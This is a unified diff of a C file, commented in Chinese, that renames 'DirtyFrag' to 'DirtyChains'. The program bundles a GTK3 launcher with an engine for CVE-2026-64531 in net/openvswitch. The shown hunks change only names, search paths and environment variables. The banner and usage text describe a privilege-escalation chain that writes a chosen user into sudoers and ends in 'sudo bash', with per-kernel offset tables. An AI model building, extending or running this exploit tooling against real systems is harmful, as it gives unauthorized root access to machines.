@@ -1,16 +1,16 @@
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyFrag 六链页缓存提权 PoC
+ *  dirtyfrag-gui.c — DirtyChains 六链页缓存提权 PoC
  *                    图形前端 + 内置引擎（单文件）
  *
  *  本文件由两部分合并而成，一个 .c 就能编出完整程序，不再需要额外的 .o：
  *
  *      第一部分  OVS 引擎（原 ovswrap.c 全文）
  *                CVE-2026-64531 net/openvswitch CT action 越界，入口 ovswrap_main
- *      第二部分  GTK3 前端（原 dirtyfrag-gui.c）
+ *      第二部分  GTK3 前端（本项目前身 dirtyfrag-gui.c）
  *                六链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
  *
  *  编译（GUI）:
- *      gcc -O2 -Wall -o dirtyfrag-gui dirtyfrag-gui.c \
+ *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
  *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
  *
  *  只编 OVS 命令行版（不含 GTK，不链接 gtk3）:
@@ -1109,7 +1109,7 @@ static unsigned long fnv1a32(const char *s)
  * 想静态编译进去 #include 即可。查找顺序（先命中者胜）：
  *
  *   -offset <dir> > $OVSWRAP_OFFSET_DIR > <可执行文件目录>/offset
- *   > ./offset > /usr/share/dirtyfrag/offset > 动态推导
+ *   > ./offset > /usr/share/dirtychains/offset > 动态推导
  * ---------------------------------------------------------------------- */
 
 #define KREC_NLANES 14
@@ -1580,6 +1580,9 @@ static int th_resolve(struct koffs *k)
         }
     }
     roots[nr++] = "offset";                       /* 当前目录 */
+    roots[nr++] = "/usr/share/dirtychains/offset";
+    roots[nr++] = "/usr/local/share/dirtychains/offset";
+    /* 1.6 及更早版本装在这里，留着免得升级后配置表全丢 */
     roots[nr++] = "/usr/share/dirtyfrag/offset";
     roots[nr++] = "/usr/local/share/dirtyfrag/offset";
 
@@ -2962,7 +2965,7 @@ static void print_target(const struct koffs *k, const struct utsname *u)
         snprintf(ts, sizeof(ts), "unknown");
 
     printf("/*\n"
-           " * target.h - dirtyfrag OVS (CVE-2026-64531) kernel offsets\n"
+           " * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets\n"
            " *\n"
            " * 放这里：offset/<N>系/<release>/target.h\n"
            " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
@@ -3444,7 +3447,7 @@ static void banner(void)
            "          -> 任意读 / dst_release 递减 -> sudoers -> sudo bash\n");
     pr_dim("  配置表：offset/<N>系/<release>/target.h，放进去就用，不用重编\n");
     pr_dim("  查找顺序：-offset <dir> / $OVSWRAP_OFFSET_DIR / <exe 目录>/offset /\n"
-           "            ./offset / /usr/share/dirtyfrag/offset\n\n");
+           "            ./offset / /usr/share/dirtychains/offset\n\n");
 }
 
 static void usage(const char *prog)
@@ -3462,7 +3465,7 @@ static void usage(const char *prog)
     pr_raw("选项:\n");
     pr_raw("  -t <user>  指定写入 sudoers 的 host 用户名（默认当前用户）\n");
     pr_raw("  -offset <dir>  配置表根目录（默认 ./offset、<exe 目录>/offset、\n"
-           "                 /usr/share/dirtyfrag/offset）\n");
+           "                 /usr/share/dirtychains/offset）\n");
     pr_raw("  -krec <release>  用另一条 release 的配置（从 offset/ 里按 N系/<release> 找）\n");
     pr_raw("  -force-derive  忽略配置表，强制走 BTF / System.map 推导\n");
     pr_raw("  -carrier / -wcarrier / -lanes / -tunnel-info  "
@@ -3650,7 +3653,7 @@ int ovswrap_main(int argc, char **argv)
 #ifndef OVSWRAP_STANDALONE
 
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyFrag 五链页缓存提权 PoC 的图形前端
+ *  dirtyfrag-gui.c — DirtyChains 五链页缓存提权 PoC 的图形前端
  *
  *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
  *      · 拼出正确的命令行
@@ -3662,7 +3665,7 @@ int ovswrap_main(int argc, char **argv)
  *  且 43284/43494/46331 成功后会 execl 到 /bin/sh 或 su, 没有 tty 会退化。
  *
  *  编译:
- *      gcc -O2 -Wall -o dirtyfrag-gui dirtyfrag-gui.c \
+ *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
  *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
  * ==========================================================================*/
 
@@ -3688,9 +3691,9 @@ int ovswrap_main(int argc, char **argv)
 #include <stdio.h>
 #include <limits.h>
 
-#define APP_TITLE       "DirtyFrag · 页缓存提权"
+#define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r10"
+#define DF_BUILD        "2026-10-31-r11"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -3706,7 +3709,7 @@ typedef struct {
     const char *name;    /* 全名 */
     const char *desc;    /* 说明 */
     const char *need;    /* 前提 */
-    int         engine;  /* 0 = 内置 dirtyfrag 引擎, 1 = ovswrap 引擎 */
+    int         engine;  /* 0 = 内置 dirtychains 引擎, 1 = ovswrap 引擎 */
 } Chain;
 
 static const Chain chains[] = {
@@ -3832,15 +3835,15 @@ static const char *kernel_release(void)
 }
 
 /*
- * 引擎入口: 由 Makefile 用 -Dmain=dirtyfrag_poc_main 把 poc 的 main 改名后
+ * 引擎入口: 由 Makefile 用 -Dmain=dirtychains_poc_main 把 poc 的 main 改名后
  * 链接进来, 于是本程序既是 GUI 也是 poc。
  */
-extern int dirtyfrag_poc_main(int argc, char **argv);
+extern int dirtychains_poc_main(int argc, char **argv);
 int ovswrap_main(int argc, char **argv);
 
 /*
  * 决定跑哪个引擎:
- *   --poc <路径> / DIRTYFRAG_POC  -> 外部 poc 可执行文件 (兼容旧用法)
+ *   --poc <路径> / DIRTYCHAINS_POC -> 外部 poc 可执行文件 (旧名 DIRTYFRAG_POC 仍认)
  *   其余情况                      -> 自身 (加 --engine 参数, 子进程 exec 自己)
  *
  * 用 "exec 自身" 而不是在 fork 出来的子进程里直接调函数: 子进程经过 exec
@@ -3860,7 +3863,10 @@ static char *self_exe(void)
 
 static char *find_poc(const char *override, gboolean *builtin)
 {
-    const char *env = g_getenv("DIRTYFRAG_POC");
+    const char *env = g_getenv("DIRTYCHAINS_POC");
+
+    if (!env || !*env)                 /* 旧名，兼容 1.6 及更早的脚本 */
+        env = g_getenv("DIRTYFRAG_POC");
 
     *builtin = FALSE;
     if (override && *override)
@@ -3875,13 +3881,15 @@ static char *find_poc(const char *override, gboolean *builtin)
 /* ---------------------------------------------------------------------------
  * 背景图
  *
- * 查找顺序: --bg 参数 > DIRTYFRAG_BG > 程序同目录 assets/bg.png > 同目录
- * bg.png > ../share/dirtyfrag/bg.png > 当前目录 > /usr[/local]/share。
+ * 查找顺序: --bg 参数 > DIRTYCHAINS_BG > 程序同目录 assets/bg.png > 同目录
+ * bg.png > ../share/dirtychains/bg.png > 当前目录 > /usr[/local]/share。
  * 找不到就用淡蓝纯色底, 界面照常可用。
  * ------------------------------------------------------------------------ */
 static char *find_bg(const char *override)
 {
     static const char *sys[] = {
+        "/usr/local/share/dirtychains/bg.png",
+        "/usr/share/dirtychains/bg.png",
         "/usr/local/share/dirtyfrag/bg.png",
         "/usr/share/dirtyfrag/bg.png",
     };
@@ -3889,7 +3897,10 @@ static char *find_bg(const char *override)
     char exe[PATH_MAX];
     ssize_t n;
     size_t i;
-    const char *env = g_getenv("DIRTYFRAG_BG");
+    const char *env = g_getenv("DIRTYCHAINS_BG");
+
+    if (!env || !*env)                 /* 旧名，兼容 */
+        env = g_getenv("DIRTYFRAG_BG");
 
     if (override && *override)
         return g_strdup(override);
@@ -3912,7 +3923,7 @@ static char *find_bg(const char *override)
             g_free(c);
         }
         {
-            char *c = g_build_filename(dir, "..", "share", "dirtyfrag",
+            char *c = g_build_filename(dir, "..", "share", "dirtychains",
                                        "bg.png", NULL);
 
             if (g_file_test(c, G_FILE_TEST_EXISTS)) {
@@ -4530,9 +4541,9 @@ static void update_desc(App *a)
 
     if (!c) {
         gtk_label_set_markup(GTK_LABEL(a->lbl_name),
-                             "<b>全部（dirtyfrag 五链）</b>");
+                             "<b>全部（dirtychains 五链）</b>");
         gtk_label_set_text(GTK_LABEL(a->lbl_desc),
-                           "检查配置与自测会依次跑完 dirtyfrag 五链；OVS 链请单独选择后再操作。");
+                           "检查配置与自测会依次跑完 dirtychains 五链；OVS 链请单独选择后再操作。");
         gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
         return;
     }
@@ -5418,7 +5429,7 @@ static void on_menu_save(GtkWidget *w, gpointer data)
                                       GTK_FILE_CHOOSER_ACTION_SAVE,
                                       "取消", GTK_RESPONSE_CANCEL,
                                       "保存", GTK_RESPONSE_ACCEPT, NULL);
-    gtk_file_chooser_set_current_name(GTK_FILE_CHOOSER(dlg), "dirtyfrag-log.txt");
+    gtk_file_chooser_set_current_name(GTK_FILE_CHOOSER(dlg), "dirtychains-log.txt");
     gtk_file_chooser_set_do_overwrite_confirmation(GTK_FILE_CHOOSER(dlg), TRUE);
 
     if (gtk_dialog_run(GTK_DIALOG(dlg)) == GTK_RESPONSE_ACCEPT) {
@@ -5579,7 +5590,7 @@ static void build_window(App *a)
 
     a->combo = gtk_combo_box_text_new();
     gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
-                                   "全部（dirtyfrag 五链，仅检查 / 自测）");
+                                   "全部（dirtychains 五链，仅检查 / 自测）");
     {
         int i;
         for (i = 0; i < N_CHAINS; i++) {
@@ -5753,8 +5764,8 @@ int main(int argc, char **argv)
 
         argv++;
         argc--;
-        argv[0] = (char *)"dirtyfrag-gui";
-        rc = dirtyfrag_poc_main(argc, argv);
+        argv[0] = (char *)"dirtychains";
+        rc = dirtychains_poc_main(argc, argv);
         fflush(NULL);
         return rc;
     }
@@ -5765,7 +5776,7 @@ int main(int argc, char **argv)
 
         argv++;
         argc--;
-        argv[0] = (char *)"dirtyfrag-gui";
+        argv[0] = (char *)"dirtychains";
         rc = ovswrap_main(argc, argv);
         fflush(NULL);
         return rc;
@@ -5790,10 +5801,10 @@ int main(int argc, char **argv)
         if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
             printf("用法: %s [--poc <路径>] [--bg <图片>]\n\n"
                    "  --poc <路径>   改用外部 poc 可执行文件 (默认用内置引擎,\n"
-                   "                 也可用环境变量 DIRTYFRAG_POC)\n"
+                   "                 也可用环境变量 DIRTYCHAINS_POC)\n"
                    "  --bg  <图片>   指定窗口背景图 (默认找同目录 bg.png,\n"
-                   "                 其次 assets/bg.png 与 /usr/share/dirtyfrag/)\n"
-                   "                 也可用环境变量 DIRTYFRAG_BG\n", argv[0]);
+                   "                 其次 assets/bg.png 与 /usr/share/dirtychains/)\n"
+                   "                 也可用环境变量 DIRTYCHAINS_BG\n", argv[0]);
             return 0;
         }
         argv[j++] = argv[i];
@@ -5826,7 +5837,7 @@ int main(int argc, char **argv)
     {
         char head[512];
         g_snprintf(head, sizeof(head),
-                   "\033[36mDirtyFrag 五链页缓存提权 PoC\033[0m  图形前端"
+                   "\033[36mDirtyChains 六链页缓存提权 PoC\033[0m  图形前端"
                    "  \033[2m构建 %s\033[0m\n"
                    "\033[2m引擎: %s\033[0m\n"
                    "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
